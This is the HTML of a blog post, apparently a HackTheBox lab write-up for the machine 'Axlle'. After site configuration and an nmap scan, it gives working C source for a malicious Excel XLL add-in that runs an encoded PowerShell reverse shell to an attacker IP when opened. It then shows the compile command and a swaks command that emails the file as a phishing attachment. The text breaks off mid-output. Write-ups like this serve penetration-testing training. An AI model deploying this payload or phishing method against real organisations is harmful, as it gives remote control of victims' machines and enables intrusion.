@@ -1,0 +1,826 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Foued SAIDI">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://foued-saidi.tech/2024/11/15/hackthebox-axlle/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="OverviewAxlle is a hard-difficulty Windows machine from HackTheBox initially dealing with a phishing attack using and XLL Excel add-on file. Later another phishing attempt utilizing .hta web shortcut">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hackthebox: Axlle">
+<meta property="og:url" content="http://foued-saidi.tech/2024/11/15/Hackthebox-Axlle/index.html">
+<meta property="og:site_name" content="Foued Saidi&#39;s Blog">
+<meta property="og:description" content="OverviewAxlle is a hard-difficulty Windows machine from HackTheBox initially dealing with a phishing attack using and XLL Excel add-on file. Later another phishing attempt utilizing .hta web shortcut">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Axlle/Axlle.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Axlle/web1.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Axlle/web2.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Axlle/blood.png">
+<meta property="article:published_time" content="2024-11-15T09:55:26.000Z">
+<meta property="article:modified_time" content="2024-11-15T15:16:26.550Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Axlle/Axlle.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/logo.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
+    <meta name="theme-color" content="#5618ff">
+    <link rel="shortcut icon" href="/images/logo.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Hackthebox: Axlle -
+        
+        Foued Saidi&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    window.config = {"hostname":"foued-saidi.tech","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"5px","image_alignment":"center","image_caption":true,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"Articles","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#5618ff","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Hello, I'm Foued SAIDI 👋","subtitle":{"text":[],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":50,"backing_speed":50,"starting_delay":500,"backing_delay":1200,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/kujen5","instagram":"https://www.instagram.com/saidi.foued/","zhihu":null,"twitter":"https://twitter.com/_kujen5","email":"foued.saidi.pro@gmail.com","linkedin":"https://www.linkedin.com/in/foued-saidi-pro/","facebook":"https://www.facebook.com/foued.saidi.980/"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.5.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/kujen5","LinkedIn":"https://www.linkedin.com/in/foued-saidi-pro/"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":{"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":2},"tags":{"enable":true,"limit":3}},"footerStart":"2023/12/22 00:00:00"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="swup-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Foued Saidi&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        HOME
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/archives"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-archive"></i>
+                                        
+                                        ARCHIVES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/categories"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-folder"></i>
+                                        
+                                        CATEGORIES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown" 
+                                    href="#" onClick="return false;">
+                                    
+                                        
+                                            <i class="fa-regular fa-user"></i>
+                                        
+                                        ABOUT&nbsp;<i class="fa-solid fa-chevron-down"></i>
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                    
+                                        <li>
+                                        <a href="/about">ME
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN
+                                        </a>
+                                        </li>
+                                    
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
+        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                HOME
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/archives"  >
+                             
+                                
+                                    <i class="fa-regular fa-archive"></i>
+                                
+                                ARCHIVES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/categories"  >
+                             
+                                
+                                    <i class="fa-regular fa-folder"></i>
+                                
+                                CATEGORIES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group has-dropdown" 
+                        href="#" onClick="return false;">
+                            
+                                
+                                    <i class="fa-regular fa-user"></i>
+                                
+                                ABOUT&nbsp;<i class="group-hover:rotate-180 transition-transform fa-solid fa-chevron-down"></i>
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                              
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" href="/about">ME</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN</a>
+                            </li>
+                        
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">Hackthebox: Axlle</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/logo.png">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Foued SAIDI</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv3</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2024-11-15 10:55:26</span>
+        <span class="mobile">2024-11-15 10:55:26</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2024-11-15 16:16:26</span>
+            <span class="mobile">2024-11-15 16:16:26</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/Hackthebox/">Hackthebox</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h3 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h3><p>Axlle is a hard-difficulty Windows machine from HackTheBox initially dealing with a phishing attack using and XLL Excel add-on file. Later another phishing attempt utilizing .hta web shortcut files in order to land a shell on a new user where we’ll be abusing the Windows Kit’s StandaloneRunner to own the system. It was really fun!<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Axlle/Axlle.png"
+                      alt="Axlle-info-card"
+                ><figcaption>Axlle-info-card</figcaption></figure></p>
+<h3 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h3><div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">0</span>xkujen&gt; nmap <span class="literal">-A</span> <span class="literal">-Pn</span> <span class="number">10.129</span>.<span class="number">217.166</span> </span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https://nmap.org ) at <span class="number">2024</span><span class="literal">-11-15</span> <span class="number">10</span>:<span class="number">59</span> W. Central Africa Standard Time</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">10.129</span>.<span class="number">217.166</span></span><br><span class="line">Host is up (<span class="number">0.12</span>s latency).</span><br><span class="line">Not shown: <span class="number">986</span> filtered tcp ports (no<span class="literal">-response</span>)</span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line"><span class="number">25</span>/tcp   open  smtp          hMailServer smtpd</span><br><span class="line">| smtp<span class="literal">-commands</span>: MAINFRAME, SIZE <span class="number">20480000</span>, AUTH LOGIN, HELP</span><br><span class="line">|_ <span class="number">211</span> <span class="keyword">DATA</span> HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY</span><br><span class="line"><span class="number">53</span>/tcp   open  domain        Simple DNS Plus</span><br><span class="line"><span class="number">80</span>/tcp   open  http          Microsoft IIS httpd <span class="number">10.0</span></span><br><span class="line">|_http<span class="literal">-title</span>: Axlle Development</span><br><span class="line">| http<span class="literal">-methods</span>:</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http<span class="literal">-server-header</span>: Microsoft<span class="literal">-IIS</span>/<span class="number">10.0</span></span><br><span class="line"><span class="number">88</span>/tcp   open  kerberos<span class="literal">-sec</span>  Microsoft Windows Kerberos (server time: <span class="number">2024</span><span class="literal">-11-15</span> <span class="number">10</span>:<span class="number">04</span>:<span class="number">54</span>Z)</span><br><span class="line"><span class="number">135</span>/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">139</span>/tcp  open  netbios<span class="literal">-ssn</span>   Microsoft Windows netbios<span class="literal">-ssn</span></span><br><span class="line"><span class="number">389</span>/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: axlle.htb0., Site: Default<span class="literal">-First-Site-Name</span>)</span><br><span class="line"><span class="number">445</span>/tcp  open  microsoft<span class="literal">-ds</span>?</span><br><span class="line"><span class="number">464</span>/tcp  open  kpasswd5?</span><br><span class="line"><span class="number">593</span>/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP <span class="number">1.0</span></span><br><span class="line"><span class="number">636</span>/tcp  open  tcpwrapped</span><br><span class="line"><span class="number">3268</span>/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: axlle.htb0., Site: Default<span class="literal">-First-Site-Name</span>)</span><br><span class="line"><span class="number">3269</span>/tcp open  tcpwrapped</span><br><span class="line"><span class="number">5985</span>/tcp open  http          Microsoft HTTPAPI httpd <span class="number">2.0</span> (SSDP/UPnP)</span><br><span class="line">|_http<span class="literal">-title</span>: Not Found</span><br><span class="line">|_http<span class="literal">-server-header</span>: Microsoft<span class="literal">-HTTPAPI</span>/<span class="number">2.0</span></span><br><span class="line">Service Info: Host: MAINFRAME; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2<span class="literal">-time</span>:</span><br><span class="line">|   date: <span class="number">2024</span><span class="literal">-11-15T10</span>:<span class="number">05</span>:<span class="number">16</span></span><br><span class="line">|_  start_date: N/A</span><br><span class="line">|_c<span class="built_in">lock-skew</span>: <span class="number">5</span>m06s</span><br><span class="line">| smb2<span class="literal">-security-mode</span>:</span><br><span class="line">|   <span class="number">3</span>:<span class="number">1</span>:<span class="number">1</span>:</span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">110.75</span> seconds</span><br></pre></td></tr></table></figure></div>
+
+<p>We can see that ldap is giving us back the domain name for this machine <code>axlle.htb</code> so let’s go ahead and add that entry to our <code>/etc/hosts</code> file. One more interesting port is <code>25</code> for SMTP, it has hMailServer running on it. This can be useful in the future.</p>
+<h3 id="Web-Application-http-axlle-htb"><a href="#Web-Application-http-axlle-htb" class="headerlink" title="Web Application - http://axlle.htb"></a>Web Application - <a class="link"   target="_blank" rel="noopener" href="http://axlle.htb/" >http://axlle.htb <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h3><p>Checking the web interface, it looks like a casual one without any special properties or buttons:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Axlle/web1.png"
+                      alt="Web Application"
+                ><figcaption>Web Application</figcaption></figure></p>
+<p>However, scrolling down a bit we can see an interesting message from the developers:</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Axlle/web2.png"
+                      alt="Web Application"
+                ><figcaption>Web Application</figcaption></figure></p>
+<p>The interesting part is this: <code>If you have any outstanding invoices or requests, please email them to accounts@axlle.htb in Excel format. Please note that all macros are disabled due to our security posture.</code></p>
+<p>From what we can understand from this message, we can email <code>accounts@axlle.htb</code> with an Excel file (Thinking of it, the machine name <code>aXLLe</code> makes sense now). I instantly get an idea about sending a phishing email with a malicious xll file and see what happens.</p>
+<p>Doing some research I stumble upon <a class="link"   target="_blank" rel="noopener" href="https://swisskyrepo.github.io/InternalAllTheThings/redteam/access/office-attacks/#xll-exec" >this page from swisskyrepo <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>. We can inject our malicious script inside this code just like this: (you can generate your malicious powershell script using <a class="link"   target="_blank" rel="noopener" href="https://www.revshells.com/" >https://www.revshells.com/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>)</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__declspec(dllexport) <span class="type">void</span> __cdecl <span class="title function_">xlAutoOpen</span><span class="params">(<span class="type">void</span>)</span>; </span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __cdecl <span class="title function_">xlAutoOpen</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// Triggers when Excel opens</span></span><br><span class="line">    WinExec(<span class="string">&quot;powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4ANAAzACIALAA5ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==&quot;</span>, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL APIENTRY <span class="title function_">DllMain</span><span class="params">( HMODULE hModule,</span></span><br><span class="line"><span class="params">                    DWORD  ul_reason_for_call,</span></span><br><span class="line"><span class="params">                    LPVOID lpReserved</span></span><br><span class="line"><span class="params">                    )</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>We put this code inside of <code>note.c</code> file and now we can email it to the “account” address using <a class="link"   target="_blank" rel="noopener" href="https://github.com/jetmore/swaks" >swaks <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>, of course after compiling the C code with <code>x86_64-w64-mingw32-gcc</code> to make it a valid .xll file:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Hackthebox/axlle]</span><br><span class="line">└─$ x86_64-w64-mingw32-gcc  -fPIC -shared -o shell.xll note.c -luser32 </span><br><span class="line">                                                                                                                                                                                                            </span><br><span class="line">┌──(kali㉿kali)-[~/Hackthebox/axlle]</span><br><span class="line">└─$ <span class="built_in">ls</span></span><br><span class="line">note.c  shell.xll</span><br><span class="line">                                                                                                                                                                                                            </span><br><span class="line">┌──(kali㉿kali)-[~/Hackthebox/axlle]</span><br><span class="line">└─$ </span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>And now send it out using swaks:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Hackthebox/axlle]</span><br><span class="line">└─$  swaks --to accounts@axlle.htb --from kujen@axlle.htb --server 10.129.217.166 --port 25 --header <span class="string">&quot;Subject: 0xkujen&quot;</span> --body <span class="string">&quot;0xkujen&quot;</span> --attach @shell.xll</span><br><span class="line">=== Trying 10.129.217.166:25...</span><br><span class="line">=== Connected to 10.129.217.166.</span><br><span class="line">&lt;-  220 MAINFRAME ESMTP</span><br><span class="line"> -&gt; EHLO kali</span><br><span class="line">&lt;-  250-MAINFRAME</span><br><span class="line">&lt;-  250-SIZE 20480000</span><br><span class="line">&lt;-  250-AUTH LOGIN</span><br><span class="line">&lt;-  250 HELP</span><br><span class="line"> -&gt; MAIL FROM:&lt;kujen@axlle.htb&gt;</span><br><span class="line">&lt;-  250 OK</span><br><span class="line"> -&gt; RCPT TO:&lt;accounts@axlle.htb&gt;</span><br><span class="line">&lt;-  250 OK</span><br><span class="line"> -&gt; DATA</span><br><span class="line">&lt;-  354 OK, send.</span><br><span class="line"> -&gt; Date: Fri, 15 Nov 2024 14:33:33 +0100</span><br><span class="line"> -&gt; To: accounts@axlle.htb</span><br><span class="line"> -&gt; From: kujen@axlle.htb</span><br><span class="line"> -&gt; Subject: 0xkujen</span><br><span class="line"> -&gt; Message-Id: &lt;20241115143333.101343@kali&gt;</span><br><span class="line"> -&gt; X-Mailer: swaks v20240103.0 